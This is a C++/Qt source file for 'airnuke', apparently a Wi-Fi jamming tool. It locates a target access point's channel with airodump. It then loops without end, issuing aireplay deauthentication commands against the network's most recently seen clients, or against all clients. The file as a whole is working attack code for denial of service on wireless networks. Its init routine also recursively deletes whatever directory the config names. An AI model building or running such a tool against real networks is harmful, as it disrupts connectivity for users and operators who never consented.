#include "airnuke.h"
#include "log.h"


airnuke::airnuke(QObject *parent) :
    QObject(parent)
{
    // get the instance of the main application
    app = QCoreApplication::instance();
    // setup everything here
    // create any global objects
    // setup debug and warning mode
}

bool airnuke::checkArgs(QCoreApplication *a)
{
    if (a == NULL)
    {
        return false;
    }

    //Check number of arguments
    QStringList args = a->arguments();
    if( args.length() != 2 )
    {
        return false;
    }

    //Check file
    if (fileExists(args.at(1)) == false)
    {
        return false;
    }
    return true;
}

bool airnuke::parseJSON(QJsonDocument jsondoc, JSONdata *curjdata)
{
    if(jsondoc.isNull() == true)
    {
        return false;
    }

    if(jsondoc.isEmpty() == true)
    {
        return false;
    }

    if(curjdata == NULL)
    {
        return false;
    }

    QJsonObject jsonobj = jsondoc.object();
    QString tempstr;
    //Get dir
    bool isValid = getStringfromObject(jsonobj,DIRSTR,&tempstr);
    if (isValid == false)
    {
        return false;
    }
    curjdata->dir = tempstr;

    //Get BSSID
    isValid = getStringfromObject(jsonobj,BSSIDSTR,&tempstr);
    if (isValid == false)
    {
        return false;
    }
    curjdata->BSSID = tempstr;

    //Get interfaces
    QStringList list;
    isValid = getStringListfromObject(jsonobj,INAMESTR,&list);
    if (isValid == false)
    {
        return false;
    }
    curjdata->interfaces = list;



    //Get BAND
    isValid = getStringfromObject(jsonobj,BANDSTR,&tempstr);
    if (isValid == false)
    {
        curjdata->band = "" ;
    }
    else
    {
        curjdata->band = tempstr;
    }

    //Get verbose
    bool verbose;
    isValid = getBoolfromObject(jsonobj,VERBOSESTR,&verbose);
    if (isValid == false)
    {
        return false;
    }
    curjdata->verbose = verbose;

    //Get LOGFILE
    isValid = getStringfromObject(jsonobj,LOGSTR,&tempstr);
    if (isValid == false)
    {
        curjdata->log = false;
    }
    else
    {
        isValid = openLog(tempstr,curjdata);
        if (isValid == false)
        {
            return false;
        }
    }


    return true;
}



bool airnuke::validateJSON(JSONdata curjdata)
{
    if (curjdata.BSSID.length() != BSSIDLENGTH)
    {
        return false;
    }

    foreach (const QString &str, curjdata.interfaces)
    {
        if (isMonitorMode(str) == false)
        {
            return false;
        }
    }

    return true;
}


bool airnuke::init(JSONdata curjdata)
{
    QString dir = curjdata.dir;

    //Check if file or folder exists
    bool isValid = fileorfolderExists(dir);
    if (isValid == true)
    {
        isValid = fileExists(dir);
        if (isValid == true)
        {
            //File exists delete it
            QDir().remove(dir);
        }
        else
        {
            //Directory delete it
            QDir tdir(dir);
            tdir.removeRecursively();
        }
    }

    //Check again
    isValid = fileorfolderExists(dir);
    if (isValid == true)
    {
        return false;
    }


    //Creater folder
    QDir().mkdir(dir);

    //Check if folder is created
    isValid = fileorfolderExists(dir);
    if (isValid == false)
    {
        return false;
    }

    return true;
}






bool airnuke::sortByTime(QHash<QString, BSSIDMACdata> map,QList<QPair<QString, QDateTime>> *sortedMap)
{
    if (map.isEmpty() == true)
    {
        return false;
    }

    QHashIterator<QString, BSSIDMACdata> info(map);
    while (info.hasNext()) {
        info.next();

        QDateTime lastseen = info.value().lastseen;
        //Find insert place
        int i;
        for (i=0;i<sortedMap->length();++i)
        {
            if (lastseen >= sortedMap->at(i).second )
            {
                break;
            }
        }

        sortedMap->insert( i,qMakePair(info.key(),lastseen));
    }
    return true;
}

bool airnuke::takeNitems(unsigned int N,QList<QPair<QString, QDateTime>> *sortedMap)
{
    if (sortedMap == NULL)
    {
        return false;
    }

    unsigned int i;
    unsigned int length = ((unsigned int)sortedMap->length());
    QList<QPair<QString, QDateTime>> newMap;
    for(i=0; (i< length ) && (i<N)  ; ++i )
    {
        newMap.append(sortedMap->at(i));
    }
    *sortedMap = newMap;
    return true;
}



bool airnuke::loop()
{
    airodumpMap.clear();
    airodumpMap.reserve(MAPSIZE);
    QString dir = jdata.dir+"/";
    QString BSSID = jdata.BSSID;
    QStringList interfaces = jdata.interfaces;
    QString band = jdata.band;
    aireplayMap.clear();
    aireplayMap.reserve(MAPSIZE);
    while (1)
    {
        //Channel info
        logInfo(jdata,"[Info] Getting channel info");

        //Start
        QStringList args = {};
        bool isValid = startAirodump(args,band,dir+"dump",interfaces.at(0),&airodumpMap);

        //Failed to start
        if (isValid == false)
        {
            logInfo(jdata,"[Error] Failed to start");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }

        //Sleep
        QThread::msleep(CHANNELLISTENTIME);

        //Verbose stop
        logInfo(jdata,"[Info] Stopping airodump");

        //Stop
        isValid = stopALLAirodump(&airodumpMap);

        //Failed to stop
        if (isValid == false)
        {
            logInfo(jdata,"[Error] Failed to stop");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }

        //Channel info
        logInfo(jdata,"[Info] Reading CSV");

        QString channelnum;
        isValid = getChannelfromCSV(dir+"dump-01.csv", BSSID, &channelnum);

        //No channel
        if (isValid == false)
        {
            logInfo(jdata,"[Error] Invalid channel");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }


        //Channel info
        logInfo(jdata,  "[Info] BSSID on channel " + channelnum);


        //Clear dir
        isValid = init(jdata);
        if (isValid == false)
        {
            logInfo(jdata,"[Error] Failed to clean dir");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }


        //Start interfaces
        args.clear();
        args << "-c" << channelnum << "--bssid" << BSSID;
        isValid = airodumpALL(args,band,dir, interfaces,&airodumpMap);
        if (isValid == false)
        {
            logInfo(jdata,"[Error] Failed to start all interfaces");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }

        logInfo(jdata, "[Info] Started (" + interfaces.join(',') +")");

        QThread::msleep(PROCESSTIME);

        //Parse each CSV;
        QStringList CSVfiles;
        isValid = findAllCSV(dir,&CSVfiles);
        if (isValid == false)
        {
            logInfo(jdata,"[Error] No CSV files");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }

        BSSIDdata BSSIDinfo;
        QHash<QString, BSSIDMACdata> map;
        map.reserve(MAPSIZE);

        logInfo(jdata,"[Info] Found CSVs (" + CSVfiles.join(',')  +")");

        //Start loop
        isValid = mergeBSSIDinfo(CSVfiles,dir,&BSSIDinfo,&map);
        if (isValid == false)
        {
            logInfo(jdata,"[Error] Failed to parse CSV");
            isValid = cleanup();
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to Clean up");
            }
            continue;
        }

        logInfo(jdata,"[Info] Parsed CSV");


        unsigned int prevbeacons = 0;

        //Clear data
        aireplayMap.clear();
        while (BSSIDinfo.beacons > prevbeacons)
        {
            //Compare beacons
            prevbeacons = BSSIDinfo.beacons;
            QThread::msleep(PROCESSTIME);
            isValid = mergeBSSIDinfo(CSVfiles,dir,&BSSIDinfo,&map);
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Invalid CSV file");
                break;
            }

            //Print Data
            logInfo(jdata,"[Data] prevbeacon " + QString::number(prevbeacons));
            logInfo(jdata,"[Data] beacon " + QString::number(BSSIDinfo.beacons));
            logInfo(jdata,"[Data] iv " + QString::number(BSSIDinfo.iv));
            //logInfo(jdata,"[Data] power " + QString::number(BSSIDinfo.power));
            logInfo(jdata,"[Data] MAP size " + QString::number(map.size()));

            //If zero clients then deauth all
            if (map.isEmpty())
            {
                logInfo(jdata,"[Info] Deauth all");
                args.clear();
                args << "-0" << "2" << "-a" << BSSID;
                startAireplay(args,BSSID, interfaces.at(0),&aireplayMap);
                continue;
            }

            //Sort list
            QList<QPair<QString, QDateTime>> sortedMap;
            isValid = sortByTime(map,&sortedMap);
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to sort list");
                continue;
            }

            //Make list length  smaller
            unsigned int aireplaynum = (unsigned int)(((unsigned int)interfaces.length()) * AIREPLAYSPERCARD);
            isValid = takeNitems(aireplaynum,&sortedMap);
            if (isValid == false)
            {
                continue;
            }

            //Remove old aireplays
            isValid = removeOldAireplays(sortedMap,&aireplayMap );
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to remove old aireplays");
                break;
            }

            //Update list
            isValid = updateAireplays(sortedMap,BSSID,interfaces,&aireplayMap);
            if (isValid == false)
            {
                logInfo(jdata,"[Error] Failed to update aireplays");
                break;
            }

            if (jdata.verbose == false)
            {
                continue;
            }

            QHashIterator<QString, Aireplaydata> info(aireplayMap);
            while (info.hasNext()) {
                info.next();
                logInfo(jdata,"[Data] " + info.key() + " : " + info.value().lastseen.toString(TIMEFORMAT) + " : " + info.value().iname);
            }

       }

       //Clean up
       isValid = cleanup();
       if (isValid == false)
       {
           logInfo(jdata,"[Error] Failed to Clean up");
       }

    }


    return true;
}

bool airnuke::cleanup()
{
    bool isValidAireplay = stopALLAireplay(&aireplayMap);
    bool isValidAirodump = stopALLAirodump(&airodumpMap);
    bool isValidinit = init(jdata);
    return (isValidAireplay || isValidAirodump) ||  isValidinit;
}

void airnuke::run()
{
    //Check if tools are installed
    bool isValid = false;
    /*
    isValid = checkDependencies(binpaths);
    if (isValid == false)
    {
        qCritical() << PATHSTR;
        abort();
    }
    */

    //Check if airmon works
    isValid = airmonCheck();
    if (isValid == false)
    {
        qCritical() << AIRNOTWORKSTR;
        abort();
    }

    //Check arguments
    if (checkArgs(app) == false)
    {
        qCritical() << CMDHELPSTR;
        abort();
    }

    QJsonDocument jsondoc;
    QString path = app->arguments().at(1);

    //Read file into object
    isValid = readJSONfile(path, &jsondoc);
    if (isValid == false)
    {
        qCritical() << JSONHELP;
        abort();
    }



    //Parse file
    isValid = parseJSON(jsondoc, &jdata);
    if (isValid == false)
    {
        qCritical() << INVALIDJSON;
        abort();
    }

    //Check if values are correct
    isValid = validateJSON(jdata);
    if (isValid == false)
    {
        qCritical() << INVALIDJSON;
        abort();
    }

    //Init
    isValid = init(jdata);
    if (isValid == false)
    {
        qCritical() << INITSTR;
        abort();
    }

    //Start loop
    logInfo(jdata,"[Info] Starting loop");

    loop();
    logInfo(jdata,"[Error] Starting loop failed");

    quit();
}


void airnuke::quit()
{
    // you can do some cleanup here
    // then do emit finished to signal CoreApplication to quit
    logInfo(jdata,"[Info] Stopping");

    bool isValid = cleanup();
    if (isValid == false)
    {
        logInfo(jdata,"[Error] Failed to Clean up");
    }
    closeLog(&jdata);
    emit finished();
}

void airnuke::aboutToQuitApp()
{
    // stop threads
    // sleep(1);   // wait for threads to stop.
    // delete any objects
    logInfo(jdata,"[Info] Stopping");

    bool isValid = cleanup();
    if (isValid == false)
    {
        logInfo(jdata,"[Error] Failed to Clean up");
    }

   closeLog(&jdata);

}
